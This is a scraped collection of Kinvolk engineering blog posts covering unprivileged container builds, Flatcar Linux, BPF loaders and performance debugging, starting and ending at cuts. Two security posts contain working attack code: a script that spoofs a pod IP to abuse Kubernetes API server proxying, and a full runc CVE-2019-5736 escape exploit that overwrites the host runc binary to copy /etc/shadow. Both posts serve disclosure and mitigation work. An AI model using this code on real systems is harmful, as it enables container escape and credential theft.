OCI compatible container image builder. buildah : A tool that facilitates building OCI images kaniko orca-build They could be a building block for CI services or serverless frameworks which need to build a container image for each function. Where user namespaces come into play In the same way that other Linux namespaces restrict the visibility of resources to processes inside the namespace, processes in user namespaces only see a subset of all possible users and groups. In the initial user namespace, there are approximately 4294967296 (2^32) possible users. The range goes from 0, for the superuser or root, to 2^32-1. uid mappings When setting up a user namespace, container runtimes allocate a range of uids and specify a uid mapping. The mapping means that uid 0 (root) in the container could be mapped to uid 100000 on the host. Root being relative means that capabilities are always relative to a specific user namespace. We will come back to that. Nested user namespaces User namespaces can be nested. The inner namespace will have the same amount (or, usually, fewer) uids than the outer namespace. Not all uids from the outer namespace are mapped, but those which are are mapped in a bijective, one-to-one way. Unprivileged user namespaces As opposed to all other kinds of Linux namespaces, user namespaces can be created by an unprivileged user (without CAP_SYS_ADMIN ). In this case, the uid mapping is restricted to a single uid. In the example below, uid 1000 on the host is mapped to root (uid 0) in the yellow container. Once the new unprivileged user namespace is created, the process inside is root from the point of view of the container and therefore it has CAP_SYS_ADMIN , so it could create other kinds of namespaces. This is a useful building block for our goal of unprivileged container builds. Operation Capability required Without root? Mount a new overlayfs CAP_SYS_ADMIN ❌ Create new user namespace No capability required (*) ✅ Create new (non-user) namespace CAP_SYS_ADMIN ✅ Chroot or pivot_root CAP_CHROOT or CAP_SYS_ADMIN ❌ Mount a new procfs CAP_SYS_ADMIN ❌ Prepare basic device nodes CAP_MKNOD or CAP_SYS_ADMIN ❌ (*): No capability is required as long as all of the following is respected:\nyour kernel is built with CONFIG_USER_NS=y your Linux distribution does not add a distro-specific knob to restrict it ( sysctl kernel.unprivileged_userns_clone on Arch Linux)\nyour uid mappings respect the restriction mentioned above\nseccomp is not blocking the unshare system call (as it could be in some Docker profiles) Each Linux namespace is owned by a user namespace Each Linux namespace instance, no matter what kind (mount, pid, etc.), has a user namespace owner. It is the user namespace where the process that created it sits. When several kinds of Linux namespaces are created in a single syscall, the newly created user namespace owns the other newly created namespaces. clone(CLONE_NEWUSER | CLONE_NEWPID | CLONE_NEWNS); The ownership of those namespaces is important because for most operations, the kernel will check that when determining whether a process has the proper capability. In the example below, a process attempts to perform a pivot_root() syscall. To succeed, it needs to have CAP_SYS_ADMIN in the user namespace that owns the mount namespace where the process is located. In other words, having CAP_SYS_ADMIN in a unprivileged user namespaces does not allow you to “escape” the container and get more privileges outside. This is done in the function may_mount() : ns_capable(current->nsproxy->mnt_ns->user_ns, CAP_SYS_ADMIN); The function ns_capable() checks if the current process has the CAP_SYS_ADMIN capability within the user namespace that owns the mount namespace ( mnt_ns ) where the current process is located ( current->nsproxy ). So by creating the new mount namespace inside the unprivileged user namespace we could do more. We can check our progress, what we achieved so far: Operation Capability required Without root? Mount a new overlayfs CAP_SYS_ADMIN ❌ Create new user namespace No capability required (*) ✅ Create new (non-user) namespace CAP_SYS_ADMIN ✅ Chroot or pivot_root CAP_CHROOT or CAP_SYS_ADMIN ✅ Mount a new procfs CAP_SYS_ADMIN ❌ Prepare basic device nodes CAP_MKNOD or CAP_SYS_ADMIN ❌ What about mounting the new overlayfs? We’ve seen that pivot_root() can be done without privileges by creating a new mount namespace owned by a new unprivileged user namespace. Isn’t this the same for mounting the new overlayfs? Granted, the mount() syscall is guarded by exactly the same call to ns_capable() that we have seen above for pivot_root() . Unfortunately, that’s not enough. New mounts vs bind mounts The mount system call can perform distinct actions: New mounts: this mounts a filesystem that was not mounted before. A block device might be provided if the filesystem type requires one (ext4, vfat). Some filesystems don’t need a block device (FUSE, NFS, sysfs). But in any case, the kernel maintains a struct super_block to keep track of options such as read-only. Bind mounts: a filesystem can be mounted on several mountpoints. A bind mount adds a new mountpoint from an existing mount. This will not create a new superblock but reuse it. The aforementioned “read-only” option can be set at the superblock level but also at the mountpoint level. In the example below, /mnt/data is bind-mounted on /mnt/foo so they share the same superblock. It can be achieved with: mount /dev/sdc /mnt/data # new mount mount --bind /mnt/data /mnt/foo # bind mount Change options on an existing mount. This can be superblock options, per-mountpoint options or propagation options (most useful when having several mount namespaces). Each superblock has a user namespace owner. Each mount has a mount namespace owner. To create a new bind mount, having CAP_SYS_ADMIN in the user namespace that owns the mount namespace where the process is located is normally enough (we’ll see some exceptions later). But creating a new mount in a non-initial user namespace is only allowed in some filesystem types. You can find the list in the Linux git repository with: $ git grep -nw FS_USERNS_MOUNT It is allowed in procfs, tmpfs, sysfs, cgroupfs and a few others. It is disallowed in ext4, NFS, FUSE, overlayfs and most of them actually. So mounting a new overlayfs without privileges for container builds seems impossible. At least with upstream Linux kernels: Ubuntu kernels had for some time the ability to do new mounts of overlayfs and FUSE in an unprivileged user namespace by adding the flag FS_USERNS_MOUNT on those 2 filesystem types along with necessary fixes. Kinvolk worked with a client to contribute to the upstreaming effort of the FUSE-part of patches. Once everything is upstream, we will be able to mount overlayfs. The FUSE mount will be upstreamed first, before the overlayfs. At that point, overlayfs could theoretically be re-implemented in userspace with a FUSE driver. Operation Capability required Without root? Mount a new overlayfs CAP_SYS_ADMIN ✅ (soon) Create new user namespace No capability required (*) ✅ Create new (non-user) namespace CAP_SYS_ADMIN ✅ Chroot or pivot_root CAP_CHROOT or CAP_SYS_ADMIN ✅ Mount a new procfs CAP_SYS_ADMIN ❌ Prepare basic device nodes CAP_MKNOD or CAP_SYS_ADMIN ❌ What about procfs? As noted above, procfs has the FS_USERNS_MOUNT flag so it is possible to mount it in an unprivileged user namespace. Unfortunately, there are other restrictions which block us in practice in Docker or Kubernetes environments. What are locked mounts? To explain locked mounts, we’ll first have a look at systemd’s sandboxing features . It has a feature to run services in a different mount namespace so that specific files and directories are read-only ( ReadOnlyPaths= ) or inaccessible ( InaccessiblePaths= ). The read-only part is implemented by bind-mounting the file or directory over itself and changing the mountpoint option to read-only. The inaccessible part is done by bind-mounting an empty file or an empty directory on the mountpoint, hiding what was there before. Using bind mounts as a security measure to make files read-only or inaccessible is not unique to systemd: container runtimes do the same. This is only secure as long as the application cannot umount that bind mount or move it away to see what was hidden under it. Both umount and moving a mount away ( MS_MOVE ) can be done with CAP_SYS_ADMIN , so systemd documentation suggests to not give that capability to a service if such sandboxing features were to be effective. Similarly, Docker and rkt don’t give CAP_SYS_ADMIN by default. We can imagine another way to circumvent bind mounts to see what’s under the mountpoint: using unprivileged user namespaces. Applications don’t need privileges to create a new mount namespace inside a new unprivileged user namespace and then have CAP_SYS_ADMIN there. Once there, what’s preventing the application from removing the mountpoint with CAP_SYS_ADMIN ? The answer is that the kernel detects such situations and marks mountpoints inside a mount namespace owned by an unprivileged user namespace as locked (flag MNT_LOCK ) if they were created while cloning the mount namespace belonging to a more privileged user namespace. Those cannot be umounted or moved. Let me describe what’s in this diagram: On the left: the host mount namespace with a /home directory for Alice and Bob. In the middle: a mount namespace for a systemd service that was started with the option “ProtectHome=yes”. /home is masked by a mount, hiding the alice and bob subdirectories. On the right: a mount namespace created by the aforementioned systemd service, inside a unprivileged user namespace, attempting to umount /home in order to see what’s under it. But /home is a locked mount, so it cannot be unmounted there. The exception of procfs and sysfs The explanation about locked mounts is valid for all filesystems, including procfs and sysfs but that’s not the full story. Indeed, in the build container, we normally don’t do a bind mount of procfs but a new mount because we are inside a new pid namespace, so we want a new procfs that reflects that. New mounts are normally independent from each other, so a masked path in a mount would not prevent another new mount: if /home is mounted from /dev/sdb and has masked paths, it should not influence /var/www mounted from /dev/sdc in any way. But procfs and sysfs are different: some files there are singletons: for example, the file /proc/kcore refers to the same kernel object, even if it is accessed from different mounts. Docker masks the following files in /proc: $ sudo docker run -ti --rm busybox mount | grep /proc/\nproc on /proc/asound type proc (ro,nosuid,nodev,noexec,relatime)\nproc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)\nproc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)\nproc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)\nproc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)\nproc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)\ntmpfs on /proc/kcore type tmpfs (rw,context=\"...\",nosuid,mode=755)\ntmpfs on /proc/latency_stats type tmpfs (rw,context=\"...\",nosuid,mode=755)\ntmpfs on /proc/timer_list type tmpfs (rw,context=\"...\",nosuid,mode=755)\ntmpfs on /proc/sched_debug type tmpfs (rw,context=\"...\",nosuid,mode=755)\ntmpfs on /proc/scsi type tmpfs (ro,seclabel,relatime) The capability needed to circumvent the restriction on those files is normally CAP_SYS_ADMIN (for e.g. umount ). To prevent a process without CAP_SYS_ADMIN from accessing those masked files by mounting a new procfs mount inside a new unprivileged user namespace and new mount namespace, the kernel uses the function mount_too_revealing() to check that procfs is already fully visible. If not, the new procfs mount is denied. Protected by Protection applies for filesystem types Bind mounts Locked mounts (MNT_LOCK) all New mounts mount_too_revealing() procfs and sysfs This is blocking us from mounting procfs from within a Kubernetes pod. Several workarounds are possible: Avoid mounting procfs in the build environment and update Dockerfiles that depend on it. Using a Kubernetes container with privileges, so that /proc in the Docker container is not covered. A “ rawproc ” option in Kubernetes is being discussed with the underlying implementation in moby . Changing the kernel to allow a new procfs mount in an unprivileged user namespace, even when the parent proc mount is not fully visible, but with the same masks in the child proc mount. I started this discussion in a RFC patch and there is an alternative proposal by Djalal Harouni to fix procfs more generally. Conclusion As you can see there are a lot of moving parts, as is the general case with Linux containers. But this is an area where development is quite active at the moment and hope for progress is greater than it has ever been. This blog post explored some aspects of the underlying mechanisms on Linux that are being worked on for unprivileged container builds: user namespaces, mounts, some filesystems. We hope to bring you updates about unprivileged container builds in the future and especially about our own involvement in these efforts. Kinvolk’s offerings Kinvolk is an engineering team based in Berlin working on Linux, Containers and Kubernetes. We combine our expertise of low-level Linux details like capabilities, user namespaces and the details of FUSE with our expertise of Kubernetes to offer specialised services for your infrastructure that goes all the way down the stack. Contact us at [email protected] to learn more about what Kinvolk does.", "date": "2018-04-25"},
{"website": "Kinvolk", "title": "Flatcar Linux is now open to the public", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Chris Kühl\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2018/04/flatcar-linux-is-now-open-to-the-public/", "abstract": "A few weeks ago we announced Flatcar Linux , our effort to create a commercially supported fork of CoreOS' container Linux . You can find the reasoning for the fork in our FAQ . Since then we’ve been testing, improving our build process, establishing security procedures, and talking to testers about their experiences. We are now satisfied that Flatcar Linux is a stable and reliable container operating system that can be used in production clusters. Open to the public Thus, today we are ready to open Flatcar Linux to the public. Thanks to our testers for testing and providing feedback. We look forward to more feedback and community feedback now that Flatcar is more widely available. For information about release and signing keys, please see the new Releases and the image signing key pages. Filing issues or feature requests You can use the Flatcar repository to file any issue or feature request you may have. Flatcar Linux documentation We are also happy to announce the initial release of our Flatcar Documentation . You can find information about installing and running Flatcar there. Commercial support for Flatcar Linux In the coming weeks we will be providing details of commercial support for Flatcar Linux. Please contact [ [email protected] ](mailto: [email protected] ?subject=Flatcar Linux support inquiry\") if you are interested in commercial support. Communication channels We’ve created a mailing list and IRC channels to facilitate communications between users and developers of Flatcar Linux. IRC: Freenode #flatcar User mailing list: https://groups.google.com/forum/#!forum/flatcar-linux-user Developer mailing list: https://groups.google.com/forum/#!forum/flatcar-linux-dev Please join those to talk about Flatcar Linux and discuss any issues or ideas you have. We look forward to hearing from you there! Flatcar Linux @ Kubecon EU The Kinvolk team will be on hand at Kubecon EU to discuss Flatcar Linux. Come by booth SU-C23 and say “Hi!”. Thanks Flatcar Linux would not exist without Container Linux. Thanks to the CoreOS team for building it and we look forward to continued cooperation with their team. Please follow Kinvolk and the Flatcar Linux project on twitter to stay informed about commercial support and other Flatcar Linux updates in the coming weeks and months.", "date": "2018-04-30"},
{"website": "Kinvolk", "title": "Exploring BPF ELF Loaders at the BPF Hackfest", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Lorenz Bauer\n    \n    \n    /\n    \n    \n  \n    \n    \n      Alban Crequy\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2018/10/exploring-bpf-elf-loaders-at-the-bpf-hackfest/", "abstract": "Just before the All Systems Go! conference, we had a BPF Hackfest at the Kinvolk office and one of the topics of discussion was to document different BPF ELF loaders. This blog post is the result of it. BPF is a new technology in the Linux kernel, which allows running custom code\nattached to kernel functions, network cards, or sockets amongst others. Since\nit is very versatile a plethora of tools can be used to work with BPF code:\nperf record, tc from iproute2, libbcc, etc. Each of these tools has a different\nfocus, but they use the same Linux facilities to achieve their goals. This post\ndocuments the steps they use to load BPF into the kernel. Common steps BPF is usually compiled from C, using clang, and “linked” into a single ELF\nfile. The exact format of the ELF file depends on the specific tool, but there\nare some common points. ELF sections are used to distinguish map definitions\nand executable code. Each code section usually contains a single, fully inlined\nfunction. The loader creates maps from the definition in the ELF using the bpf(BPF_MAP_CREATE) syscall and saves the returned file descriptors [1]. This\nis where the first complication comes in, because the loader now has to rewrite\nall references to a particular map with the file descriptor returned by the bpf() syscall. It does this by iterating through the symbol and relocation\ntables contained in the ELF, which yields an offset into a code section. It\nthen patches the instruction at that offset to use the correct fd [2]. After this fixup is done, the loader uses bpf(BPF_PROG_LOAD) with the patched\nbytecode [3]. The BPF verifier resolves map fds to the in-kernel data\nstructure, and verifies that the code is using the maps correctly. The kernel\nrejects the code if it references invalid file descriptors. This means that the\noutcome of BPF_PROG_LOAD depends on the environment of the calling process. After the BPF program is successfully loaded, it can be attached to a variety\nof kernel subsystems [4]. Some subsystems use a simple syscall (e.g. SO_ATTACH ), while others require netlink messages (XDP) or manipulating the\ntracefs (kprobes, tracepoints). Small differences between BPF ELF loaders The different loaders offer different features and for that reason use slightly\ndifferent conventions in the ELF file. The ELF conventions are not part of the\nLinux ABI. It means that an ELF file prepared for one loader usually cannot\njust be loaded by another one. The map definition struct ( struct bpf_elf_map in the schema) is the main varying part. BPF ELF loader \\ Features Maps in maps Pinning NUMA node bpf2bpf function call libbpf (Linux kernel) map def no no Yes (via samples ) Yes Perf map def no no no yes iproute2 / tc map def yes Yes (none, object, global) no Yes gobpf map def Not yet Yes (none, object, global, custom ) no no newtools/ebpf yes no no yes There are other varying parts in loader ELF conventions that we found noteworthy: Some use one ELF section per map, some use one “maps” sections for all the maps. The naming of the sections and the function entrypoint vary. Some have default section names that can be overridden in the CLI (tc), some requires well-defined prefixes (“kprobe”, “kretprobes/”). Some use csv-style parameters in the section name ( perf ), some give an API in Go to programmatically change the loader’s behaviour. Conclusion BPF is actively developed in the Linux kernel and whenever a new feature is implemented, BPF ELF loader might need an update as well to support it. The different BPF ELF loaders have different focuses and might not add support of all BPF kernel new features at the same speed. There are efforts underway to standardise on libbpf as the canonical implementation. The plan is to ship libbpf with the kernel, which means it will set the de-facto standard for user space BPF support.", "date": "2018-10-09"},
{"website": "Kinvolk", "title": "Improving Kubernetes Security", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Alban Crequy\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2018/12/improving-kubernetes-security/", "abstract": "In summer 2018, the Gardener project team asked Kinvolk to execute several\npenetration tests in its role as a third-party contractor. We applied our\nKubernetes expertise to identify vulnerabilities on Gardener installations and\nto make recommendations. Some of our findings are now presented in this article on the Gardener\nwebsite . We presented some of our findings in a joint presentation with SAP entitled Hardening Multi-Cloud Kubernetes Clusters as a\nService at KubeCon 2018 in\nShanghai . The slides in\nPDF and the video recording are now\navailable. We also presented it at the Gardener Bi-weekly\nMeeting ,\nsee the agenda for Friday 7 Dec\n2018 . If you need help with penetration testing your installation, please contact us\nat [email protected] .", "date": "2018-12-07"},
{"website": "Kinvolk", "title": "Kinvolk welcomes Thilo Fromm as Director of Engineering", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Chris Kühl\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2019/01/kinvolk-welcomes-thilo-fromm-as-director-of-engineering/", "abstract": "Today we are pleased to announce Thilo Fromm has joined Kinvolk as Director of Engineering.\nHe comes to us via Amazon Web Services where he we was a Technical Project Manager on the EC2 team.\nBefore that he worked at ProfitBricks on virtual machine and cloud-focused Linux kernel projects. As Director of Engineering, Thilo will be responsible for overseeing our engineering team and its efforts.\nHe brings with him a valuable combination of technical expertise and project management skills that will be crucial in helping us grow our engineering team and expand our technical service and product offerings.\nThe result will be increased value to our clients and the open source projects and communities to which we contribute. Our guiding principle at Kinvolk is to be a valuable contributor to the open-source projects and communities that we participate in.\nWith the addition of Thilo, the Kinvolk team gains another long-time contributor and supporter of open-source Linux projects.\nHis passion for free and open-source software mirrors that of the founding team, making Thilo a perfect fit. Adding Thilo to the team kicks off a very exciting 2019 for Kinvolk.\nOver the next few months, we will be announcing new products, services and events.\nIn order to deliver those, we’ll be announcing further additions to the leadership team in the near future.\nStay tuned for those announcements and other posts by subscribing to our channels.", "date": "2019-01-15"},
{"website": "Kinvolk", "title": "Abusing Kubernetes API server proxying", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Michael Schubert\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2019/02/abusing-kubernetes-api-server-proxying/", "abstract": "The Kubernetes API server\nproxy allows a user outside of a Kubernetes cluster to connect to cluster IPs which\notherwise might not be reachable. For example, this allows accessing a service\nwhich is only exposed within the cluster’s network. The apiserver acts as a\nproxy and bastion between user and in-cluster endpoint. API server proxy security advisory Last summer, while performing penetration testing, we found an issue with\nKubernetes API server proxying. We took this discovery to the private\nKubernetes security\nlist which recently lead to a security\nadvisory . “ Operators of the API server are strongly advised to operate the Kubernetes\nAPI server in the same network as the nodes or firewall it sufficiently. It is\nhighly recommended to not run any other services you wish to be secure and\nisolated on the same network as the cluster unless you firewall it away from\nthe cluster, specifically any outbound connections from the API server to\nanything else. The Kubernetes control plane has many user-configurable features\n(aggregated APIs, dynamic admission webhooks, and conversion webhooks coming\nsoon) which involve the Kubernetes API server sourcing network traffic. ” Prior to the advisory an update to\nKubernetes was made\nwhere proxy functionality was disabled for loopback and link-local addresses.\nThat makes it no longer possible to abuse apiserver proxying for pods to\nreach, for example,  sidecar containers or the well-known link-local address\n169.254.169.254. This address is commonly used for meta data services in cloud\nenvironments (e.g. AWS) and often gives access to secret data. API server remains open to abuse It’s great that we’ve now got those cases covered, but the apiserver still can\nbe abused as an open HTTP proxy. Thus, it remains crucial to isolate the\nnetwork correctly. Let’s take a closer look to understand why this is. The interesting question to investigate is, “Can we trick the\napiserver into connecting to IP addresses that are not part of the cluster’s\nnetwork and not assigned to a pod or service in the cluster?” Additionally, in a\nKubernetes setup where the Kubernetes API server is operated in a different\nnetwork than the worker nodes (as for example on GKE): can we abuse the\napiserver’s built-in proxy to send requests to IP addresses within the\napiserver’s network or to sidecar containers of it (in a self-hosted Kubernetes cluster )\nthat are not meant to be reachable for users at all? When the apiserver receives a proxy request for a service or pod, it looks up\nan endpoint or pod IP address to forward the request to. Both endpoint and pod IP are\npopulated from the pod’s status which contains the podIP field as reported by the kubelet. So what happens if\nwe send our own pod status for a nginx pod as shown in the following script? #!/bin/bash set -euo pipefail readonly PORT = 8001 readonly POD = nginx-7db75b8b78-r7p79 readonly TARGETIP = 172.217.19.78 while true; do curl -v -H 'Content-Type: application/json' \\ \"http://localhost: ${ PORT } /api/v1/namespaces/default/pods/ ${ POD } /status\" > \" ${ POD } -orig.json\" cat $POD -orig.json |\n    sed 's/\"podIP\": \".*\",/\"podIP\": \"' ${ TARGETIP } '\",/g' \\ > \" ${ POD } -patched.json\" curl -v -H 'Content-Type:application/merge-patch+json' \\ -X PATCH -d \"@ ${ POD } -patched.json\" \\ \"http://localhost: ${ PORT } /api/v1/namespaces/default/pods/ ${ POD } /status\" rm -f \" ${ POD } -orig.json\" \" ${ POD } -patched.json\" done From the apiserver’s perspective, the pod now has IP address 172.217.19.78.\nWhen we try to connect to the pod via kubectl proxy, the apiserver will in fact\nestablish a HTTP connection to 172.217.19.78, our target IP. curl localhost:8001/api/v1/namespaces/default/pods/nginx-7db75b8b78-r7p79/proxy/\n…\n<a href = \"//www.google.com/\" /><span id = \"logo\" aria-label = \"Google\" ></span></a>\n... As demonstrated, we can indeed trick the apiserver. The moral of this story is to follow the advisory’s recommendation and isolate your network properly. If you need help improving the security of your Kubernetes environment, please contact us\nat [email protected] .", "date": "2019-02-01"},
{"website": "Kinvolk", "title": "runc “breakout” Vulnerability Mitigated on Flatcar Linux", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Alban Crequy\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2019/02/runc-breakout-vulnerability-mitigated-on-flatcar-linux/", "abstract": "Last week, a high severity vulnerability was disclosed by the maintainers of\nrunc, under the name CVE-2019-5736: runc container\nbreakout . This\nvulnerability has high severity (CVSS score 7.2) because it allows a malicious\ncontainer to overwrite the host runc binary and gain root privileges on the\nhost. According to our research, however, when using Flatcar Linux with its\nread-only filesystems this vulnerability is not exploitable. runc vulnerability background In the context of our security work, we had been asked to evaluate the report’s severity with respect to the client’s installation. In the course of this evaluation, we wrote an exploit in order to understand how it works and to test if their installation was vulnerable. While we did recognize the severity of the issue, we also ascertained that the client was not affected. To understand this, let’s take a look at how things should work versus what could happen if the exploit was successfully executed. How containers should work Let’s first look at the following diagram showing how runc should work. runc forks a new process that becomes the pid1 of the container. Following the\ntraditional fork/exec Unix model, that process is so far only a copy of the\nparent process and therefore still runs the “runc” program. /proc/self/exe points to runc while running in the container. Then, pid1 will execute the entrypoint in the container, meaning the program\nrunning will be substituted to the program in the container. How our runc exploit works The runc exploit code changes the  normal behaviour in the following ways Instead of executing our own program in the container, we set the entrypoint\nto /proc/self/exe , meaning runc will run runc again. So /proc/1/exe will be a reference to runc for a longer time. However, we don’t want to run the runc code. With LD_PRELOAD , we will\nexecute a routine that will sleep for a few seconds in order to keep the\nreference /proc/1/exe for the next step. During those few seconds, we have enough time to enter the container with runc exec and open a reference to /proc/1/exe , while it is still pointing\nto runc (file descriptor 10 in our exploit). At this point, we cannot open runc in read-write mode because pid1 is still\nrunning runc. We would get the error “text busy” if we tried. The sleep in pid1 terminates and executes something else (another sleep but\nvia /bin/sh so pid1 does not lock runc ). Finally, we have a temporary read-only file descriptor to the runc binary on\nthe host filesystem and we use tee /proc/self/fd/10 to acquire a new file\ndescriptor in write mode and to overwrite the runc binary. Our exploit container image is simply a LD_PRELOAD program: FROM fedora:latest\nRUN ln -s /proc/self/exe /exe\nRUN dnf install -y gcc\nRUN mkdir -p /src\nCOPY foo.c /\nRUN gcc -Wall -o /foo.so -shared -fPIC /foo.c -ldl\nENV LD_PRELOAD=/foo.so\nCMD [ \"/usr/bin/sh\" ] Here is the source code: #define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n#include <dlfcn.h>\n#include <unistd.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n\nstatic void __myinit(void) __attribute__((constructor));\nstatic void __myinit(void)\n{\n  int pid;\n  unsetenv(\"LD_PRELOAD\");\n\n  pid = getpid();\n  if (pid == 1) {\n    printf(\"I am pid 1. Sleeping 3 seconds...\\n\");\n    sleep(3);\n    printf(\"I am pid 1. Sleeping forever...\\n\");\n    execl(\"/bin/sh\", \"sh\", \"-c\",\n          \"/bin/sleep 1000\",\n          (char *) 0);\n    exit(0);\n  }\n\n  printf(\"I am pid %d. Starting Hijack...\\n\", pid);\n  execl(\"/bin/sh\", \"sh\", \"-c\",\n        \"exec 10< /proc/1/exe ; \"\n        \"echo Lookup inode of /proc/1/exe: ; \"\n        \"stat -L --format=%i /proc/1/exe ; \"\n        \"echo sleep 4 ; \"\n        \"sleep 4 ; \"\n        \"printf '#!/bin/sh\\\\ncp /etc/shadow /home/ubuntu/\\\\nchmod 444 /home/ubuntu/shadow\\\\n' | tee /proc/self/fd/10 > /dev/null ; \"\n        \"echo done ; \",\n        (char *) 0);\n\n  exit(0);\n} This program is a single function compiled into foo.so , loaded via the\nenvironment variable $LD_PRELOAD . It will be executed both as the initial\nprocess in the container (pid 1) and whenever entering in the container with docker exec . If it’s running as pid 1 ( if (pid == 1) ), it will run the red\npart of the diagram above. If it’s running via docker enter , it will run the\nbottom part of the diagram above. Running the exploit on Ubuntu When trying this on Ubuntu, we can overwrite runc on the host. When executing the exploit, /usr/bin/docker-runc is overwritten by the\nmalicious script that copies the password file /etc/shadow from the host,\nmaking it available for others to read. Trying the exploit on Flatcar Linux Then, we tried the same exploit on Flatcar\nLinux and we couldn’t reach the same result. Flatcar Linux mounts /usr in read-only mode, protecting most programs from\nbeing overwritten. However, this test does not use runc from /usr/bin/runc but from /run/torcx/unpack/docker/bin/runc (managed by torcx ). But torcx also uses a read-only\nmount for the programs, so it is protected the same way. Conclusion As we have demonstrated, the read-only filesystems feature of Flatcar Linux is\ncapable of mitigating this runc vulnerability. It can also help against similar\nexploits of this class. In addition, Flatcar Linux delivers updates\nautomatically, including security fixes. These are some of the reasons we are\npushing Flatcar Linux forward and using it as the base for our upcoming open\nsource products. Since developing our own exploit, the researchers who found this vulnerability\nand the maintainers of runc also published their exploit, working in a similar\nway: https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html https://groups.google.com/a/opencontainers.org/forum/#!topic/dev/RFURhHE8FD4 If you want to learn more about Flatcar Linux, head over to flatcar-linux.org . If you need help with security assessments, penetration testing, or engineering\nservices contact us at [email protected] .", "date": "2019-02-18"},
{"website": "Kinvolk", "title": "Inside Kinvolk Labs: Investigating Kubernetes performance issues with BPF", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Alban Crequy\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/04/inside-kinvolk-labs-investigating-kubernetes-performance-issues-with-bpf/", "abstract": "One of the things we do in the Kinvolk Labs team is provide expert technical\nconsulting for customers who are experiencing issues with their Kubernetes or\nLinux environments — from security audits to networking troubles to\ntroubleshooting puzzling performance problems. A few weeks back, video advertising technology company Smartclip reached out to us at Kinvolk to\ninvestigate performance issues with their Kubernetes deployment. In this blog\npost, I will give you some insight into our processes and explain how we\nrapidly identified and solved the problem, using BPF tools from the BCC\nproject. Finally, I’ll explain how Inspektor Gadget enables you to easily have\naccess to these same BPF tools for your own Kubernetes installation. Description of the problem The Kubernetes cluster runs, among other things, nginx with fluentd and Apache\nFlume to handle logs. After deploying a new version of Kubernetes, the devops\nteam noticed a performance regression issue in fluentd: it became unable to\nhandle the logs fast enough and it kept buffering the logs until it reached the\nlimit. Unfortunately, that regression issue was only visible after a few days in\nproduction and, despite the team’s attempts to create a reproduction scenario\nin a dev environment, could not be reproduced in testing outside of production.\nIt was also more likely to happen in the evening when there is more traffic to\nhandle. Initial ideas to investigate The upgrade implied several changes: a new version of the Linux kernel, a new\nversion of Kubernetes, a different Docker version, etc. In order to find out\nwhich change caused the problem, the Smartclip team isolated the different\nchanges one by one until they found the one change that caused the regression\nissue: updating from Kubernetes v1.14.4 to v1.16.4. It was surprising at first: I didn’t see any reason why any Kubernetes\ncomponent  (kube-apiserver, controller managers, kubelet, etc.) should cause\nthe applications (fluentd and Apache Flume) to go slower. I was given ssh access to one good node (running Kubernetes v1.14.4) and one\nbad node (running v1.16.4) so I could find out what was the difference between\nthem. My initial ideas were to compare the following between the two nodes: Linux distribution version Kernel version and configuration Docker version Cgroup configuration of the pod (cpu, blkio) Docker image used by the pods\n-Kubelet configuration However, I didn’t see any difference between the good node and the bad node. Using the BCC CPU profiler The BPF Compiler Collection (BCC) project contains tools for performance analysis. One of them is a CPU\nprofiler :\nit works by taking samples of kernel or userspace stack traces at timed\nintervals, and counting how many times each of them is visible. The performance issue only happened in production and it is not advisable to\ninstall new tools on production nodes without testing. Fortunately, BCC and its\nCPU profiler can be executed as a container without installing it on the node. docker run --rm -ti --privileged \\\n    --net=host --pid=host \\\n    -v /usr/src:/usr/src \\\n    -v /lib/modules:/lib/modules \\\n    docker.io/kinvolk/bcc \\\n    /usr/share/bcc/tools/profile -d -f -K -p $FLUENTD_PID 10 You can find the container image in Kinvolk’s public container repository at docker.io/kinvolk/bcc . If for some reason you need to build your own image,\nyou can use the new section in the GitHub action that we contributed\nupstream a month ago. This command prints the kernel stack traces ordered by frequency, from the\nleast frequent to the most frequent. This allows the user to look at the last\nlines of the output to get the most significant ones. The last line of the\noutput was this kernel stack: thread.rb:70;xen_hvm_callback_vector;xen_evtchn_do_upcall;irq_exit;__softirqentry_text_start;net_rx_action;ena_io_poll;ena_clean_rx_irq;napi_gro_receive;netif_receive_skb_internal;__netif_receive_skb;__netif_receive_skb_core;ip_rcv;ip_rcv_finish;ip_forward;ip_forward_finish;ip_output;ip_finish_output;ip_finish_output2;dev_queue_xmit;__dev_queue_xmit;__qdisc_run;sch_direct_xmit;dev_hard_start_xmit;br_dev_xmit;br_forward;__br_forward;nf_hook_slow;ebt_out_hook;ebt_in_hook;ebt_ip_mt;ebt_ip_mt 3 This stack with the function ebt_ip_mt() is listed only on the bad node. We\nfound a different behaviour between the good node and the bad node. It is worth\nexploring this. Analysis of the problem Looking at the kernel sources, ebt_ip_mt() is part of Netfilter, responsible\nfor filtering packets at the data link layer. Many people are familiar with the iptables command to check the firewall rules at the network and transport\nlayer, but Netfilter also has the command ebtables for the firewall rules at\nthe data link layer. This gives the idea to check the bridging firewall rules with ebtables -L . On\nthe bad node, I notice the following: Bridge chain: KUBE-DEDUP, entries: 4268, policy: ACCEPT\n-p IPv4 -s e2:3f:9b:74:a8:7a -o veth+ --ip-src 10.2.207.0/24 -j DROP\n-p IPv4 -s e2:3f:9b:74:a8:7a -o veth+ --ip-src 10.2.207.0/24 -j DROP\n-p IPv4 -s 